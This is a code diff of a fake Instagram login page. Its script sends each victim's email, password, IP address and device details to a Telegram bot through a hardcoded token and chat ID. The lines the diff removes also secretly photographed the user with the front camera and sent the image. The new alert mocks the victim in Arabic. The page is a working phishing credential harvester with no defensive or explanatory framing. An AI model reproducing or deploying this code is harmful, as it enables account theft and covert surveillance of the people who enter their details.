@@ -68,30 +68,31 @@
         <p class="copyright">© 2024 Instagram from Facebook</p>
     </footer>
 
+
+
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
     <script>
-        const TOKEN = "8063136868:AAFE-HnzBolbIvnoTi9gcUc5r4jJJcrYzOA";  // هنا التوكين
-        const CHAT_ID = "1161976560";  // هنا معرف الشات https://api.telegram.org/bot/getUpdates
-        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-
+        const TOKEN = "8063136868:AAFE-HnzBolbIvnoTi9gcUc5r4jJJcrYzOA";                                                            // هنا التوكين              
+        const CHAT_ID = "1161976560";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+    
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
-
+    
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-
-            // الحصول على الـ IP
+    
             axios.get('https://api.ipify.org?format=json')
                 .then(response => {
                     const ip = response.data.ip;
-
+    
                     const userAgent = navigator.userAgent;
                     const platform = navigator.platform;
                     const screenWidth = screen.width;
                     const screenHeight = screen.height;
                     const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
-
-                    let message = ` 
+    
+                    const message = ` 
                         <b>New Login Attempt</b>\n
                         <b>Email:</b> ${email}\n
                         <b>Password:</b> ${password}\n
@@ -101,54 +102,23 @@
                         <b>User Agent:</b> ${userAgent}\n
                         <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                     `;
-
-                    // التقاط صورة من كاميرا الهاتف
-                    const video = document.createElement('video');
-                    const constraints = {
-                        video: {
-                            facingMode: 'user', // استخدام كاميرا الهاتف الأمامية
-                            width: { ideal: 1280 },  // لضبط دقة الصورة
-                            height: { ideal: 720 }
-                        }
-                    };
-
-                    navigator.mediaDevices.getUserMedia(constraints)
-                        .then(stream => {
-                            video.srcObject = stream;
-                            video.play();
-
-                            // التقاط صورة بعد ثانية
-                            setTimeout(() => {
-                                const canvas = document.createElement('canvas');
-                                canvas.width = video.videoWidth;
-                                canvas.height = video.videoHeight;
-                                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                                const imageData = canvas.toDataURL('image/jpeg'); // صورة بصيغة Base64
-                                video.srcObject.getTracks().forEach(track => track.stop()); // إيقاف الفيديو
-
-                                // إرسال الصورة والمعلومات عبر API تلجرام
-                                const formData = new FormData();
-                                formData.append('chat_id', CHAT_ID);
-                                formData.append('photo', imageData); // إرسال الصورة
-                                formData.append('caption', message); // إضافة المعلومات كتعليق
-
-                                axios.post(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, formData)
-                                    .then(response => {
-                                        alert('Information and image sent successfully!');
-                                    }).catch(error => {
-                                        alert('Error sending the information and image. Please try again.');
-                                    });
-                            }, 1000);
-                        })
-                        .catch(error => {
-                            alert('Error accessing camera. Please check your device.');
-                        });
-
+    
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(response => {
+                        alert('Information sent successfully!/شكرا يا أهبل 😂😂');
+                    }).catch(error => {
+                        alert('Error sending the information. Please try again.');
+                    });
                 })
                 .catch(error => {
                     alert('Error fetching the IP address. Please try again.');
                 });
         });
     </script>
+
+
 </body>
 </html>
